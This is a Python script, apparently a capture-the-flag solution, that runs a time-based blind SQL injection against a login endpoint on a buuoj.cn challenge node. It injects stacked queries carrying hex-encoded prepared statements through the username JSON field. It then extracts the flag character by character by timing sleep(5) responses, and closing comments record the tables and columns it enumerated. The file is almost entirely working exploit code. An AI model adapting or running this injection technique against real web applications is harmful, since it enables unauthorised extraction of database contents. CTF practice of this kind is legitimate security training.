import requests
import time
import string


url = "http://9d5b5506-521c-40ef-aab0-a191bdf87035.node3.buuoj.cn/index.php?r=Login/Login"

def jisuan(in_payload):


    payload = "set @a = 0x{}; prepare pentest from @a;execute pentest -- ".format(format_payload(in_payload))
    data = '{{"username":"kkp\';{}","password":"admin"}}'.format(payload)


    start_time = time.time()
    print(in_payload)
    r = requests.get(url=url,data=data)
    end_time = time.time()
    continue_time = end_time - start_time
    # print("所用时间为：",continue_time)
    # print(r.text)
    if (continue_time > 5):
        return True
    
    return False




def format_payload(raw_payload):

    result_list = []
    for x in raw_payload:
        result_list.append(hex(ord(x))[2:])
    return "".join(result_list)


"""
{"username":"kkp';set @a = 0x73656C65637420736C656570283529; prepare pentest from @a;execute pentest-- ","password":"admin"}
"""


def format_sql(input_sql):
    keday = string.printable
    # keday_2_digits = [x for x in range(60) ]        # this is length jisuan 
    # keday = keday_2_digits

    for x in keday:
        if (jisuan(input_sql.format(str(x)))):
            return str(x)



def main():
    # print(jisuan("select sleep(5)"))

    
    last_result = []
    for x in range(1,31):
        index = format_sql("select if(substr((select group_concat(flag) from flag),"+str(x)+",1)='{}',sleep(5),1)")
        # index = format_sql("select if(length((select group_concat(flag) from flag))={},sleep(5),1)")
        if (index):
            last_result.append(index)
    print("".join(last_result))





if __name__ == "__main__":
    main()


# length(database()) == 3
# database = ' ct'

# length((select group_concat(table_name) from information_schema.tables where table_schema=database() == 9

# tables:flag,use
# columns:flag
# columns_data_length:30